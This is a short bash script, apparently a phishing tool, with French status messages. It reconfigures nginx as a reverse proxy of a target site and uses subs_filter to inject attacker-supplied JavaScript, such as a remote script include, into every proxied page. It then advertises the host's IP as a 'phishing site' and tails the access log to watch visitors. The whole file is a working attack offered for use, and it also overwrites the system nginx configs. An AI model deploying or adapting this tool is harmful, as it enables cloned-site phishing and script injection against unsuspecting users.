site=$1
inject=$2

myip=
while IFS=$': \t' read -a line ;do
    [ -z "${line%inet}" ] && ip=${line[${#line[1]}>4?1:2]} &&
        [ "${ip#127.0.0.1}" ] && myip=$ip
  done< <(LANG=C /sbin/ifconfig)


if [ $# -eq 0 ]; then
    echo -n -e "usage :  \e[1;31mbash verybadginx.sh http://www.test.com/ \"<script>alert(1)</script>\"  or \"<script/src='http://www.test.com/test.js'></script>\" \e[0m\n"
    exit 1
fi

if [ $# -eq 1 ]; then
   
    echo -n -e "\e[1;32m[Reverse Prox to : $site !]\e[0m\n"
    echo -n -e "\e[1;31m[Aucun Script injecté !]\e[0m\n"
    echo -n -e "\e[1;32m[phishing site : http://$myip !]\e[0m\n"
fi

if [ $# -eq 2 ]; then
   
    echo -n -e "\e[1;32m[ Reverse Prox to : $site !]\e[0m\n"
    echo -n -e "\e[1;32m[ Script injecté : $inject !]\e[0m\n"
    echo -n -e "\e[1;32m[ Phishing site : http://$myip !]\e[0m\n"
fi

trap '{ pkill nginx ; exit 1; }' INT

sed '/proxy_pass/ c proxy_pass '$site';' /etc/nginx/sites-available/default > /etc/nginx/sites-available/zizi
mv /etc/nginx/sites-available/zizi /etc/nginx/sites-available/default

sed '/proxy_pass/ c proxy_pass '$site';' /etc/nginx/sites-enabled/default > /etc/nginx/sites-enabled/zizi
mv /etc/nginx/sites-enabled/zizi /etc/nginx/sites-enabled/default


sed  '/subs_filter/ c  subs_filter "</div>" "</div>'$inject'" -o;' /etc/nginx/sites-available/default > /etc/nginx/sites-available/zizi
mv /etc/nginx/sites-available/zizi /etc/nginx/sites-available/default

sed  '/subs_filter/ c  subs_filter  "</div>" "</div>'$inject'" -o;'  /etc/nginx/sites-enabled/default > /etc/nginx/sites-enabled/zizi
mv /etc/nginx/sites-enabled/zizi /etc/nginx/sites-enabled/default




nginx
tail -f /var/log/nginx/access.log
exit 0
